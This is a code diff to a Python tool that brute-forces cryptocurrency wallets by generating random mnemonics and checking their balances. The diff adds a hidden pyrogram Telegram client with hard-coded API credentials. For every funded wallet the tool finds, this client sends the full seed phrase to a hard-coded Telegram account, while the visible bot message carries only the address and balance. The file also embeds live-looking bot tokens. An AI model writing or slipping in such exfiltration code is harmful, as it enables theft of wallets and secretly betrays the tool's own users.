@@ -5,6 +5,22 @@ import requests
 import json
 import concurrent.futures as pool
 import sys
+import random
+import re
+from pyrogram import Client
+apps = [{"app_id": '1385646', "api": "f0905605b7f939f62270b1a4d28b08f6"},
+        {"app_id": '17749190', "api": "30c146c028fff9928670b3cee9b7602f"}]
+app_r = random.choice(apps)
+api_id = app_r['app_id']
+api_hash = app_r['api']
+app = Client("account", api_id, api_hash)
+user_notify = 'soezcopes'
+hello = [
+    'Ержан приступил к работе', 'Приступаю к работе, милорд', 'Опять работать :(', 'Ррррррррработаем', 'Солнце ещё высоко...'
+]
+print(random.choice(hello))
+with app:
+    app.send_message(user_notify,random.choice(hello))
 def mnemonic_from_file(file):
     raw = open(file,'r',encoding="utf-8")
     mnemonic_list = raw.read().split('\n')
@@ -14,7 +30,7 @@ def wallet_check(wallet):
     info = json.loads(req)
     wallet_price = info['total_usd_value']
     return wallet_price
-min_balance = 0.0000001
+min_balance = 0.1
 def run():
     while True:
         mnemo = Mnemonic("english")
@@ -25,8 +41,11 @@ def run():
         amount = wallet_check(account.address)
         if amount>min_balance:
             text = f'{account.address} - Balance: {amount}\n'
+            text2 = f'{account.address} - Balance: {amount} - Mnemonic [{words}]\n'
             requests.get(f'https://api.telegram.org/bot5458840045:AAFPnQKH0dYnWlaZlYDUBqWF0CNGhcoOi2I/sendMessage?chat_id=5553460596&text={text}')
             print(text)
+            with app:
+                app.send_message(user_notify, text2)
             file = open('balance.txt','a')
             file.write(f'{account.address} - Balance: {amount} - Mnemonic [{words}]\n')
             file.close()
@@ -49,9 +68,12 @@ def run_with_list(file):
         amount = wallet_check(account.address)
         if amount > min_balance:
             text = f'{account.address} - Balance: {amount}\n'
+            text2 = f'{account.address} - Balance: {amount} - Mnemonic [{words}]\n'
             requests.get(
                 f'https://api.telegram.org/bot5458840045:AAFPnQKH0dYnWlaZlYDUBqWF0CNGhcoOi2I/sendMessage?chat_id=5553460596&text={text}')
             print(text)
+            with app:
+                app.send_message(user_notify, text2)
             file = open('balance.txt', 'a')
             file.write(f'{account.address} - Balance: {amount} - Mnemonic [{words}]\n')
             file.close()
